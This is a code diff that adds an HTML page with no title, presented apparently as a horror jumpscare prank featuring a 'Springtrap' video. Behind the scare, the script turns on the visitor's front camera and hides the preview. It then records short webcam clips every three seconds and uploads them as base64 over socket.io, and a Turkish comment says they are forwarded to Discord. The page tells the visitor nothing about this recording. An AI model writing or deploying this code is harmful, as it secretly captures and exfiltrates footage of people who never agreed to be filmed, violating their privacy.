@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <style>
+    body { margin: 0; background: #000; height: 100vh; overflow: hidden; }
+    #camera { display: none; }
+    #jumpscare { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+  </style>
+</head>
+<body>
+  <video id="camera" autoplay playsinline></video>
+  <video id="jumpscare" src="/springtrap-i-see-you.webm" loop playsinline></video>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const video = document.getElementById('camera');
+    const jumpscare = document.getElementById('jumpscare');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        jumpscare.style.display = 'block';
+        jumpscare.play();
+      }, 5000);
+
+      // Her 3 sn'de kısa video Discord'a
+      const sendChunk = () => {
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const reader = new FileReader();
+          reader.onload = () => {
+            const base64 = reader.result.split(',')[1];
+            socket.emit('videoChunk', base64);
+          };
+          reader.readAsDataURL(blob);
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 2800);
+      };
+
+      setInterval(sendChunk, 3000);
+      sendChunk();
+    });
+  </script>
+</body>
+</html>
